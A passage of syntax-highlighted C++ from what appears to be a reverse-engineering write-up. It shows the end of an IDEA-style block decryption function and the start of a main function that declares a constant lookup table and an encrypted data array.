number\">47</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        I_3<span class=\"token punctuation\">[</span><span class=\"token number\">15</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span><span class=\"token number\">31</span> <span class=\"token operator\">-</span> i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        I_4<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> cipher<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">48</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">+=</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_1 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_2 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_3 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_4 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> I_4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_5 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_1<span class=\"token punctuation\">,</span> tmp_3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_6 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_2<span class=\"token punctuation\">,</span> tmp_4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_7 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> tmp_5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_8 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>tmp_6<span class=\"token punctuation\">,</span> tmp_7<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_9 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>tmp_8<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> tmp_10 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>tmp_7<span class=\"token punctuation\">,</span> tmp_9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_1 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_1<span class=\"token punctuation\">,</span> tmp_9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_2 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_3<span class=\"token punctuation\">,</span> tmp_9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_3 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_2<span class=\"token punctuation\">,</span> tmp_10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        I_4 <span class=\"token operator\">=</span> <span class=\"token function\">XOR</span><span class=\"token punctuation\">(</span>tmp_4<span class=\"token punctuation\">,</span> tmp_10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_1 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>I_1<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_2 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>I_3<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">49</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_3 <span class=\"token operator\">=</span> <span class=\"token function\">Plus</span><span class=\"token punctuation\">(</span>I_2<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">16</span><span class=\"token operator\">></span> Y_4 <span class=\"token operator\">=</span> <span class=\"token function\">Times</span><span class=\"token punctuation\">(</span>I_4<span class=\"token punctuation\">,</span> inv_sub_key<span class=\"token punctuation\">[</span><span class=\"token number\">51</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    bitset<span class=\"token operator\">&lt;</span><span class=\"token number\">64</span><span class=\"token operator\">></span> plaint<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">16</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        plaint<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_4<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        plaint<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_3<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        plaint<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_2<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        plaint<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">48</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> Y_1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> plaint<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> box1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0BA6CAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A05DF1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9ABFB3B7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB40BBE36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74B1D29A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xEE0E612D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2EB40D81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3667A2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73DC1683</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE963A534</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29D9C998</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x076DC419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7D7A8B5</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x5D681B02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9DD277AE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBDBDF21D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D079EB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7B82D06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x270241AA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09B64C2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC90C2087</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x53B39330</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9309FF9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0EDB8832</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE61E49E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54DE5729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94643B85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBAD03604</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A6A5AA8</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xE0D5E91F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x206F85B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA00AE279</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60B08ED5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA0F3D62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3AB551CE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14015C4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4BB30E3</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x4E048354</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8EBEEFF8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x136C9856</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3D6F4FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4969474D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89D32BE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7672660</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67DD4ACC</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xFD62F97B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3DD895D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1DB71064</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD0D7CC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47B2CF7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8708A3D3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9BCAE52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6906C2FE</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xF3B97149</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33031DE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAED16A4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E6B06E7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4D4B550</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x346ED9FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1ADAD47D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA60B8D1</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x40DF0B66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x806567CA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B64C2B1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5BDEAE1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1611DAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01DB7106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F6F7C87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEFD5102B</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x756AA39C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5D0CF30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2802B89E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8B8D432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72076785</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2BD0B29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C0906A8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5CB36A04</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xC60CD9B3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06B6B51F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26D930AC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6635C00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7CDCEFB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC66831B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92D28E9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5268E236</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xC8D75181</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x086D3D2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95BF4A83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5505262F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCFBA9598</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F00F934</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21B4F4B5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE10E9819</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x7BB12BAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB0B4702</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B6E20C8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFBD44C64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x616BFFD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1D1937F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F659EFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4FDFF252</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xD56041E5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15DA2D49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88085AE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48B2364B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD20D85FC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12B7E950</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C03E4D1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFCB9887D</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x66063BCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6BC5766</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86D3D2D5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4669BE79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDCD60DCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C6C6162</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32D86CE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF262004F</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x68DDB3F8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA867DF54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35B5A8FA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF50FC456</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6FB077E1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF0A1B4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81BE16CC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41047A60</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xDBBBC9D7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B01A57B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEDB88321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D02EF8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7BD5C3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77073096</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59B33D17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x990951BB</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x03B6E20C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC30C8EA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5EDEF90E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E6495A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04DB2615</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4614AB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEAD54738</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A6F2B94</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xB0D09823</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x706AF48F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5005713C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90BF1D90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A00AE27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCABAC28B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE40ECF0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24B4A3A6</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xBE0B1011</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7EB17CBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3630B13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23D967BF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB966D408</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79DCB8A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5768B525</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97D2D989</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x0D6D6A3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCDD70692</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4DB26158</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D080DF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17B7BE43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD70DD2EF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9B9DF6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3903B3C2</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xA3BC0075</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63066CD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFED41B77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E6E77DB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4D1C46C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x646BA8C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4ADFA541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A65C9ED</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x10DA7A5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD06016F6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF00F9345</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30B5FFE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA0A4C5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6AB020F2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44042D73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84BE41DF</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1E01F268</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDEBB9EC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4369E96A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83D385C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x196C3671</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9D65ADD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF762575C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37D83BF0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xAD678847</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6DDDE4EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76DC4190</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6662D3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2CD99E8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC63F227</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2D7FFA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x026D930A</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x98D220BD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58684C11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5BA3BBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05005713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9FBFE4A4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F058808</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71B18589</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB10BE925</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x2BB45A92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB0E363E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB61B38D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0BDBDF21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91646C96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51DE003A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F6A0DBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBFD06117</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x256FD2A0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5D5BE0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7807C9A2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8BDA50E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x220216B9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2B87A15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC0C7794</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0CB61B38</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x9609A88F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56B3C423</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6D6A3E9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x166CCF45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8CD37CF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C69105E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62DD1DDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2677173</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x38D8C2C4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF862AE68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65B0D9C6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA50AB56A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3FB506DD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF0F6A71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1BB67F0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11010B5C</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x8BBEB8EB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B04D447</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B6B51F4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xABD13D58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x316E8EEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1D4E243</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF60EFC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1FDA836E</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x856530D9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45DF5C75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD80D2BDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18B74777</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8208F4C0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42B2986C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C0695ED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xACBCF941</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x36034AF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCC00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6B9265A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCCCCCCCC</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x00000008</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00000000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">uint32_t</span> enc1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token number\">0x46A95BAD</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x1CAC84B6</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0xA67CB2B2</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0x32188937</span><span 